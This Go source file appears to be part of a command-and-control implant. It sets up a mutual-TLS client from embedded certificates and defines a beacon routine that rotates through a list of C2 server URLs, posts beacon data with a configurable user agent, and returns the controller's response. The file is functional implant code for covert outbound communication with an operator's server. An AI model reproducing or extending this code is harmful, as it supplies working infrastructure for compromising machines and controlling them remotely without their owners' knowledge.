//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

var (
	mtlsClientCert tls.Certificate
	mtlsCertLoaded bool
)

func initMTLS() {
	mtlsTransport.TLSClientConfig = newAgentTLSConfig("")

	if MTLSCertStr == "" || MTLSKeyStr == "" {
		return
	}
	cert, err := tls.X509KeyPair([]byte(MTLSCertStr), []byte(MTLSKeyStr))
	if err != nil {
		if Debug {
			fmt.Printf("[!] mTLS: failed to load client cert: %v\n", err)
		}
		return
	}
	mtlsClientCert = cert
	mtlsCertLoaded = true

	if MTLSCAStr != "" {
		pool := x509.NewCertPool()
		if pool.AppendCertsFromPEM([]byte(MTLSCAStr)) {
			mtlsTransport.TLSClientConfig.RootCAs = pool
		}
	}
	if mtlsCertLoaded {
		mtlsTransport.TLSClientConfig.Certificates = []tls.Certificate{mtlsClientCert}
	}
}

var mtlsTransport = &http.Transport{
	MaxIdleConns:        10,
	MaxIdleConnsPerHost: 5,
	IdleConnTimeout:     60 * time.Second,
}

var mtlsClient = &http.Client{
	Transport: mtlsTransport,
	Timeout:   30 * time.Second,
	CheckRedirect: func(req *http.Request, via []*http.Request) error {
		if len(via) >= 3 {
			return http.ErrUseLastResponse
		}
		return nil
	},
}

func sendMTLSBeacon(body []byte) []byte {
	startIdx := currentC2Idx
	for i := 0; i < len(C2URLs); i++ {
		idx := (startIdx + i) % len(C2URLs)
		c2URL := C2URLs[idx]

		if !strings.HasPrefix(c2URL, "mtls://") {
			continue
		}

		httpURL := "https://" + strings.TrimPrefix(c2URL, "mtls://")

		req, err := http.NewRequest(BeaconMethod, httpURL+BeaconURI, bytes.NewReader(body))
		if err != nil {
			continue
		}
		req.Header.Set("Content-Type", "application/json")
		req.Header.Set("User-Agent", UserAgent)

		resp, err := mtlsClient.Do(req)
		if err != nil {
			if Debug {
				fmt.Printf("[!] mTLS beacon to %s failed: %v\n", c2URL, err)
			}
			continue
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			if Debug {
				fmt.Printf("[!] mTLS %s returned %d\n", c2URL, resp.StatusCode)
			}
			continue
		}

		data, err := io.ReadAll(resp.Body)
		if err != nil {
			continue
		}
		currentC2Idx = idx
		if Debug {
			fmt.Printf("[+] mTLS Beacon OK from %s, response %d bytes\n", c2URL, len(data))
		}
		return data
	}
	return nil
}
